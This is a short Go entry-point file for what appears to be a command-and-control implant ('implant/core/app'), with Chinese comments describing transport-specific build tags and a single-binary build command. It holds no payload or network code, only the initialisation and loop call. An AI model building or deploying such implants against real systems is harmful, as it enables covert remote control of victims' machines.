//go:build !dll

package main

import "implant/core/app"

// listenerType 由各 transport 文件定义（如 transport_tcp.go 定义 const listenerType = "tcp"）。
// 单二进制 + build tag：go build -tags transport_tcp ./cmd/single
func main() {
	if _, ok := app.Init(listenerType); !ok {
		return
	}
	runLoop()
}
